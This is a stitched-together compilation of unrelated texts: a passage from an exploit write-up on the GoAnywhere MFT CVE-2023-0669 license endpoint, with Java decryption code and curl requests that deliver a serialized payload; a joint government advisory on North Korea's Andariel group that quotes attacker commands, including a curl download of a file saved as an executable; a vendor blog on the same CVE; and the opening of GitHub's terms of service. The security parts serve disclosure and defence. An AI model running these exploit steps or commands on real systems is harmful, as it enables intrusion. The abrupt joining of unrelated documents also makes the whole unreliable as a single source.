                return true;
            }
            return false;
        }
        return false;
    }

```

That token is basically an anti-CSRF token, and is sent to the server as part of the encrypted bundle. But because the bundle is symmetrically encrypted, we can actually get access to that value. We can get the encrypted bundle from a new server (with no license installed) by requesting the manual activation page:

```
$ curl 'http://10.0.0.219:8000/goanywhere/license/ManualLicense.xhtml'
[...]
p55wfyVKXDVM/bAVZtDLOg[.......]$2
[...]

```

That page isn’t accessible (anonymously) once a license has been installed, though. But after trying different requests, we noticed that you can append a character to the `Unlicensed.xhtml` page to view it even after licensing the server. Here’s an example, where we changed the page to `Unlicensed.xhtmlx`:

```
$ curl -i 'http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtmlx?GARequestAction=activate'
HTTP/1.1 302
[...]
Set-Cookie: ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54; Path=/goanywhere; HttpOnly
Location: https://my.goanywhere.com:443/lic/request?bundle=p55wfyVKXDVM/bAVZtDLOg[.......]$2
Content-Length: 0
Date: Wed, 08 Feb 2023 23:36:58 GMT

```

The `bundle` parameter in the `Location` header is the encrypted bundle. We wrote some Java code that uses GoAnywhere MFT’s own libraries to decrypt it:

```
import com.linoma.license.gen2.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.nio.charset.StandardCharsets;
import java.security.SignedObject;
import java.util.zip.GZIPInputStream;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
public class DecodeBundle {
  public static void main(String[] args) throws Exception {
    // Initialize the encryption code
    LicenseEncryptor.getInstance().initialize(true);
    // Decode the base64
    byte []decoded = Base64.decodeBase64(args[0].getBytes(StandardCharsets.UTF_8));
    // Decrypt the AES
    byte []decrypted = LicenseEncryptor.getInstance().decrypt(decoded, "2");
    // Unwrap the data that's in a SignedObject and SignedContainer
    ObjectInputStream secureObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(decrypted));
    SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
    byte[] data = ((SignedContainer) signedObject.getObject()).getData();
    // Uncompress
    GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(data));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    IOUtils.copy(gZIPInputStream, byteArrayOutputStream);
    byte []uncompressed = byteArrayOutputStream.toByteArray();
    // Display
    System.out.write(uncompressed);
  }
}

```

It has to be compiled and executed using GoAnywhere MFT’s .jar files in order to access the functions:

```
$ export CP=".:GoAnywhere-7.1.2/lib/licenseapi-2.0-4.0.1.jar:GoAnywhere-7.1.2/lib/linoma-security-commons-1.0.0.jar:GoAnywhere-7.1.2/lib/commons-io-2.11.0.jar:GoAnywhere-7.1.2/lib/commons-codec-1.15.jar:GoAnywhere-7.1.2/lib/linoma-security-core-1.0.0.jar"
$ javac -cp $CP DecodeBundle.java && java -cp $CP DecodeBundle "p55[...]k"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<request v="2" t="1">
    <r>
        <process>http://10.0.0.219:8000/goanywhere/lic/accept/5bc7e61c-b3ac-4ec4-82d6-21d51213675a</process>
        <cancel>http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtml</cancel>
    </r>
    <p c="1" v="7.1.2"/>
    <s os="Linux">
        <u>00-0C-29-47-38-B5</u>
    </s>
</request>

```

It successfully decrypted the token, giving us a `<process>` and `<cancel>` link. The `<process>` link specifically contains the full URL you need to successfully pass the new `LICENSE_REQUEST_TOKEN` check. Here’s how we can send the same payload (note that we also need the session ID cookie – `ASESSIONID`):

```
$ curl -ib 'ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54' -ik 'http://10.0.0.219:8000/goanywhere/lic/accept/d2d80248-5013-41b8-8cbf-1c1ca9bc3541?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2'
HTTP/1.1 500
X-UA-Compatible: IE=edge
[...]

```

With that change, we are now back to the HTTP/500 error from earlier! But in the logs, we see a new error:

```
com.linoma.license.gen2.BundleException: Class name not accepted: java.util.PriorityQueue
	at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:136)
	at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
	at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)
[...]
Caused by: java.io.InvalidClassException: Class name not accepted: java.util.PriorityQueue
	at org.apache.commons.io.serialization.ValidatingObjectInputStream.invalidClassNameFound(ValidatingObjectInputStream.java:95)

	at org.apache.commons.io.serialization.ValidatingObjectInputStream.resolveClass(ValidatingObjectInputStream.java:100)

```

That led us to look more closely at the `BundleWorker.validate()` function:

```
   private static byte[] verify(byte[] bArr, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream secureObjectInputStream = getSecureObjectInputStream(bArr, SignedObject.class, byte[].class);
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(signatureType))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (secureObjectInputStream != null) {
                secureObjectInputStream.close();
            }
            return data;
        } catch (Throwable th) {
            // [...]
        }
    }

```

`getSecureObjectInputStream` returns an instance of `org.apache.commons.io.serialization.ValidatingObjectInputStream` that only permits two classes to be deserialized: `SignedObject` and `byte[]`. The first thing it does after creating the `SignedObject` is to verify it, using a `publicKey` that’s decrypted from a local keystore. We verified that we don’t have the associated private key, nor can we modify fields in `SignedObject` to force the `verify()` call to pass, so this signature check appears to prevent further exploitation.

So in the end, we were able to bypass the new `LICENSE_REQUEST_TOKEN` requirement, but the `ValidatingObjectInputStream` and `SignedObject` prevents a malicious object from being deserialized.

## IOCs

The vendor’s advisory suggests the following:

```
Search the userdata/logs/[system_name]-goanywhere.log files on your system.
NOTE: By default there are 10 logs that are archived when a log size reaches 5 MB. [system_name] represents each system or node in your cluster. You should search all of these 10 archive logs for all systems/nodes in your cluster. Standalone (non-HA) logs will be goanywhere.log, goanywhere.log1, goanywhere.log2, etc.)
The search term should be for the following line:
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
     at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
     at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
     at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
     at java.util.PriorityQueue.heapify(PriorityQueue.java:736)
     at java.util.PriorityQueue.readObject(PriorityQueue.java:796)

```

We confirmed that that’s the error that our proof of concept generates, as well. Keep in mind, however, that the attacker can delete that logfile if they choose.

## Guidance

As of writing, this issue is not patched, and therefore all installations are vulnerable. Ensuring that network-level access to the administrator port is restricted to the least number of users possible is good; however, because this can be exploited via a user’s browser, it only raises the bar.

The vendor advises that user’s remove access to the vulnerable endpoint in their `web.xml` file:

```
-   Disable the LicenseResponseServlet as follows:
-   On the file system where GoAnywhere MFT is installed, edit the file [install_dir]/adminroot/WEB-INF/web.xml
-   Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.
**Before:**
           <servlet>
                      <servlet-name>License Response Servlet</servlet-name>
                      <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
                      <load-on-startup>0</load-on-startup>
           </servlet>
           <servlet-mapping>
                      <servlet-name>License Response Servlet</servlet-name>
                      <url-pattern>/lic/accept</url-pattern>
           </servlet-mapping>
**After:**
<!--
Add these tags to comment out the following section (as shown) or simply delete this section if you are not familiar with XML comments
-->
<!--
           <servlet>
                      <servlet-name>License Response Servlet</servlet-name>
                      <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
                      <load-on-startup>0</load-on-startup>
           </servlet>
           <servlet-mapping>
                      <servlet-name>License Response Servlet</servlet-name>
                      <url-pattern>/lic/accept</url-pattern>
           </servlet-mapping>
-->
-   Restart the GoAnywhere MFT application.

```

We confirmed that the mitigation steps work.

Cybersecurity Advisory
# North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs

Release DateJuly 25, 2024
Alert CodeAA24-207A

 Related topics:
[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience), [Incident Detection, Response, and Prevention](/topics/cyber-threats-and-advisories/incident-detection-response-and-prevention), [Nation-State Cyber Actors](/topics/cyber-threats-and-advisories/nation-state-cyber-actors)

## **Summary**

The U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this Cybersecurity Advisory to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju:

* U.S. Cyber National Mission Force (CNMF)
* U.S. Cybersecurity and Infrastructure Security Agency (CISA)
* U.S. Department of Defense Cyber Crime Center (DC3)
* U.S. National Security Agency (NSA)
* Republic of Korea’s National Intelligence Service (NIS)
* Republic of Korea’s National Police Agency (NPA)
* United Kingdom’s National Cyber Security Centre (NCSC)

The RGB 3rd Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as [Andariel](https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government "Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations"), [Onyx Sleet](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide "How Microsoft names threat actors") (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa. The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3rd Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.

The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.

The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.

The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:

For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s [North Korea Cyber Threat Overview and Advisories](https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/north-korea "North Korea Cyber Threat Overview and Advisories") webpage.

## **Technical Details**

### RGB 3rd Bureau

[Andariel](https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government "Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations") (also known as [Onyx Sleet](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide "How Microsoft names threat actors"), formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.

#### **Cyber Espionage**

The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.

*Table 1. Andariel Cyber Espionage Victimology*
| Industry | Information Targeted |
| --- | --- |
| **Defense** | * Heavy and light tanks and self-propelled howitzers * Light strike vehicles and ammunition supply vehicles * Littoral combat ships and combatant craft * Submarines, torpedoes, unmanned underwater vehicles (UUVs), and autonomous underwater vehicles (AUVs) * Modeling and simulation services |
| **Aerospace** | * Fighter aircraft and unmanned aerial vehicles (UAVs) * Missiles and missile defense systems * Satellites, satellite communications, and nano-satellite technology * Surveillance radar, phased-array radar, and other radar systems |
| **Nuclear** | * Uranium processing and enrichment * Material waste and storage * Nuclear power plants * Government nuclear facilities and research institutes |
| **Engineering** | * Shipbuilding and marine engineering * Robot machinery and mechanical arms * Additive manufacturing and 3D printing components and technology * Casting, fabrication, high-heat metal molding, and rubber and plastic molding * Machining processes and technology |

The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs.

#### **Ransomware**

Andariel actors fund their espionage activity through ransomware operations against U.S. healthcare entities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware and cyber espionage against the same entity. For more information on this ransomware activity, see joint advisories [#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3293960/us-south-korean-agencies-partner-to-stopransomware-threat-from-dprk/ "#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities") and [North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-187a " North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector").

### Malicious Cyber Espionage Activity

This advisory uses the [MITRE ATT&CK for Enterprise](https://attack.mitre.org/versions/v15/matrices/enterprise/ "Enterprise Matrix") framework, version 15. See the Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.

#### **Reconnaissance and Enumeration**

While there is limited available information on the group’s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers [[T1595](https://attack.mitre.org/versions/v15/techniques/T1595/ "Active Scanning"), [T1592](https://attack.mitre.org/versions/v15/techniques/T1592 "Gather Victim Host Information")]. The actors gather open source information about their victims for use in targeting [[T1591](https://attack.mitre.org/versions/v15/techniques/T1591 "Gather Victim Org Information")] and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [[T1596](https://attack.mitre.org/versions/v15/techniques/T1596/ "Search Open Technical Databases")].

#### **Resource Development, Tooling, and Remote Access Tools**

The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.

* Atharvan
* ELF Backdoor
* Jupiter
* MagicRAT
* “No Pineapple”
* TigerRAT
* Valefor/VSingle
* ValidAlpha
* YamaBot
* NukeSped
* Goat RAT
* Black RAT
* AndarLoader
* DurianBeacon
* Trifaux
* KaosRAT
* Preft
* Andariel Scheduled Task Malware
* BottomLoader (see Cisco Talos blog Operation Blacksmith)
* NineRAT (see Cisco Talos blog Operation Blacksmith)
* DLang (see Cisco Talos blog Operation Blacksmith)
* Nestdoor (see AhnLab blog)

These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [[T1587.001](https://attack.mitre.org/versions/v15/techniques/T1587/001/ "Develop Capabilities: Malware"), [T1587.004](https://attack.mitre.org/versions/v15/techniques/T1587/004/ "Develop Capabilities: Exploits")]. The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.

#### **Commodity Malware and Dual-Use Applications**

Commodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. Dual-use applications are software tools widely available for purchase or use that are commonly utilized by administrators and users for system administration or other legitimate purposes and also by threat actors for malicious activities. These dual-use applications may reside locally, known as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use of publicly available malware and dual-use applications. The use of publicly available malware  and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success obfuscating their identities by leveraging open source malware. The authoring agencies have identified the following open-source and dual-use tools as used and/or customized by the actors:

* 3Proxy [[T1090](https://attack.mitre.org/versions/v15/techniques/T1090/ "Proxy")]
* AdFind [[S0552](https://attack.mitre.org/versions/v15/software/S0552/ "AdFind")]
* AsyncRAT
* DeimosC2
* Impacket [[T1090](https://attack.mitre.org/versions/v15/techniques/T1090/ "Proxy")]
* Juggernaut [[T1040](https://attack.mitre.org/versions/v15/techniques/T1040 "Network Sniffing")]
* Lilith RAT
* ORVX Web Shell
* Mimikatz [[S0002](https://attack.mitre.org/versions/v15/software/S0002/ "Mimikatz")]
* PLINK [[T1572](https://attack.mitre.org/versions/v15/techniques/T1572/ "Protocol Tunneling")]
* ProcDump [[T1003](https://attack.mitre.org/versions/v15/techniques/T1003/ "OS Credential Dumping")]
* PuTTY [[T1572](https://attack.mitre.org/versions/v15/techniques/T1572/ "Protocol Tunneling")]
* SOCKS5 [[T1090](https://attack.mitre.org/versions/v15/techniques/T1090/ "Proxy")]
* Stunnel [[T1572](https://attack.mitre.org/versions/v15/techniques/T1572/ "Protocol Tunneling")]
* Web Shell by Orb (WSO)
* WinRAR [[T1560](https://attack.mitre.org/versions/v15/techniques/T1560/ "Archive Collected Data")]
* WinSCP [[T1048](https://attack.mitre.org/versions/v15/techniques/T1048 "Exfiltration Over Alternative Protocol")]
* RDP Wrapper [[T1572](https://attack.mitre.org/versions/v15/techniques/T1572/ "Protocol Tunneling")]

#### **Initial Access**

The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously [[T1190](https://attack.mitre.org/versions/v15/techniques/T1190 "Exploit Public-Facing Application")].

#### **Execution**

The actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer `netstat` commands, such as `netstat –naop` and `netstat –noa` [[T1059](https://attack.mitre.org/versions/v15/techniques/T1059/ "Command and Scripting Interpreter")]. Example commands used by the actors include the following:

* `netstat –naop`
* `netstat –noa`
* `pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>`
* `curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\users\public\notify[.]exe`
* `C:\windows\system32\cmd.exe /c systeminfo | findstr Logon`

These actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples.

#### **Defense Evasion**

The actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as `vmp0` and `vmp1` for VMProtect and Themida or randomized file section names for Themida [[T1027](https://attack.mitre.org/versions/v15/techniques/T1027/ "Obfuscated Files or Information")].

#### **Credential Access**

The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting of the `NTDS.dit` file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the `vssadmin` command-line utility to back up a volume to retrieve a copy of the `NTDS.dit` file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials [[T1003](https://attack.mitre.org/versions/v15/techniques/T1003/ "OS Credential Dumping")].

#### **Discovery**

The actors used customized file system enumeration tooling written in .NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes [[T1087](https://attack.mitre.org/versions/v15/techniques/T1087 "Account Discovery"), [T1083](https://attack.mitre.org/versions/v15/techniques/T1083 "File and Directory Discovery")].

The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network [[T1021.002](https://attack.mitre.org/versions/v15/techniques/T1021/002 "Remote Services: SMB/Windows Admin Shares")].

#### **Lateral Movement**

The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the `%Temp%` directory.

The actors have also used Remote Desktop Protocol (RDP) to move laterally [[T1021](https://attack.mitre.org/versions/v15/techniques/T1021)].

#### **Command and Control**

The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy [[T1090](https://attack.mitre.org/versions/v15/techniques/T1090/ "Proxy"), [T1071](https://attack.mitre.org/versions/v15/techniques/T1071/ "Application Layer Protocol")].

#### **Collection and Exfiltration**

Malware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling [[T1560](https://attack.mitre.org/versions/v15/techniques/T1560/ "Archive Collected Data"), [T1039](https://attack.mitre.org/versions/v15/techniques/T1039 "Data from Network Shared Drive")].

The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data [[T1567](https://attack.mitre.org/versions/v15/techniques/T1567 "Exfiltration Over Web Service")]. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols [[T1048](https://attack.mitre.org/versions/v15/techniques/T1048 "Exfiltration Over Alternative Protocol")].

The actors have also been identified staging files for exfiltration on victim machines, establishing Remote Desktop Protocol connections, and conducting `HTTP GET` requests on port `80` to receive information [[T1021](https://attack.mitre.org/versions/v15/techniques/T1021 "Remote Services")].

## **Mitigation Measures**

The authoring agencies recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on the threat actors’ activity.

### Log4Shell and Other Log4j Vulnerabilities

Defenders should consult the joint Cybersecurity Advisory titled “[Mitigating Log4Shell and Other Log4j-Related Vulnerabilities](https://media.defense.gov/2021/Dec/22/2002914139/-1/-1/1/JOINT_CSA_MITIGATING_LOG4SHELL_OTHER_LOG4J_VULNERABILITIES_20211222_.PDF "Mitigating Log4Shell and Other Log4j-Related Vulnerabilities")” and CISA’s “[Apache Log4j Vulnerability](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance "Apache Log4j Vulnerability Guidance")” guidance. Organizations can mitigate the risks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j-related vulnerabilities and upgrading Log4j assets and affected products to the latest version.

**Note:** CVE-2021-44228 ‘Log4Shell’ was disclosed in December 2021 and affects the Log4j library prior to version 2.17.0.

Defenders should remain alert to vendor software updates, and initiate hunt and incident response procedures to detect possible Log4Shell exploitation.

### Web Shell Malware

Web shell malware is deployed by adversaries on a victim’s web server to execute arbitrary system commands. The NSA and Australian Signals Directorate’s report titled “[Detect and Prevent Web Shell Malware](https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF "Detect and Prevent Web Shell Malware")” provides mitigating actions to identify and recover from web shells.

Preventing exploitation of web-facing servers often depends on maintaining an inventory of systems and applications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application Firewalls (WAFs).

### Endpoint Activity

Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server to critical assets.

### Command Line Activity and Remote Access

Monitoring for suspicious command-line activity, implementing multi-factor authentication for remote access services, and properly segmenting and using allow-listing tools for critical assets can protect against malicious activity by RGB 3rd Bureau’s Andariel group and other cyber threat actors.

### **Packing**

Signatures for Themida, VMProtect and a number of other packers are available [here](https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar "ditekshen / detection"), however, the signatures will not identify every file packed using these applications.

### Additional Mitigation Measures for Malicious Activities

* Check for security vulnerabilities, apply patches, and update to the latest version of software
* Encrypt all sensitive data including personal information
* Block access to unused ports
* Change passwords when they are suspected of being compromised
* Alert on unexpected use of dual-use applications
* Strengthen the subscriber identity authentication process for leased servers

### DPRK Rewards for Justice

The U.S. and ROK Governments encourage victims to report suspicious activities, including those related to suspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such information through the Department of State’s Rewards for Justice program could make you eligible to receive an award of up to $10 million.

*Emergent threats evolve quickly. As we learn more about this vulnerability, we will update this blog post with relevant information about technical findings, product coverage, and other information that can assist you with assessment and mitigation.*

On Thursday, February 2, 2023, security reporter Brian Krebs [published a warning](https://infosec.exchange/%40briankrebs/109795710941843934) on Mastodon about an actively exploited [zero-day vulnerability](https://www.rapid7.com/fundamentals/zero-day-attack/) affecting on-premise instances of Fortra’s [GoAnywhere MFT](https://www.goanywhere.com/) managed file transfer solution. Fortra (formerly HelpSystems) evidently published an advisory on February 1 behind authentication; there is no publicly accessible advisory.

CVE-2023-0669 has been assigned to this vulnerability.

Rapid7 has published a technical analysis of CVE-2023-0669 on [AttackerKB](https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis?utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_anywheremft)

**Update: Fortra released a patch (7.1.2) on February 7, 2023 to address this actively exploited vulnerability.**

According to the advisory, which Krebs quoted directly in his Mastodon post, the vulnerability is a remote code injection flaw that requires administrative console access for successful exploitation. Fortra said that the Web Client interface itself is not exploitable. While administrative consoles and management interfaces should ideally never be exposed to the internet, security researcher Kevin Beaumont noted in a reply to Krebs’s post on Mastodon that there appears to be [a fair number of systems](https://infosec.exchange/%40GossiTheDog%40cyberplace.social/109795921030336780) (1,000+) exposing administrative ports to the public internet.

The Fortra advisory Krebs quoted advises GoAnywhere MFT customers to review all administrative users and monitor for unrecognized usernames, especially those created by `system`. The logical deduction is that Fortra is likely seeing follow-on attacker behavior that includes the creation of new administrative or other users to take over or maintain persistence on vulnerable target systems.

Note that, while this is not mentioned explicitly in the pasted Fortra advisory text, it is also possible that threat actors may be able to obtain administrative access by targeting reused, weak, or default credentials.

### Mitigation guidance

**While Fortra has published a mitigation, there is no mention of a patch.** GoAnywhere MFT customers can [log into the customer portal](https://my.goanywhere.com/webclient/Login.xhtml) to access direct communications from Fortra.

The following mitigation information has been taken from Krebs’s repost of the Fortra advisory on Mastodon, but **has not been verified** by our research team:

On the file system where GoAnywhere MFT is installed, edit the file `[install_dir]/adminroot/WEB_INF/web.xml`.

Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.

**Before:**

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>

```

**After:**

```
<!--

```

Add these tags to comment out the following section (as shown) or simply delete this section if you are not familiar with XML comments:

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>
</servlet-mapping>
 -->

```

Restart the GoAnywhere MFT application. If GoAnywhere MFT is clustered, this change needs to happen on every instance node in the cluster.

### Rapid7 customers

The February 3, 2023 content-only release of InsightVM and Nexpose will add support for customers to use the following query to identify potentially affected GoAnywhere MFT instances in their environments:

`asset.software.product = 'Managed File Transfer'`.

A remote (unauthenticated) [vulnerability check](https://www.rapid7.com/db/vulnerabilities/goanywhere-cve-2023-0669-remote-code-injection/) is available as of the February 6, 2023 content release.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
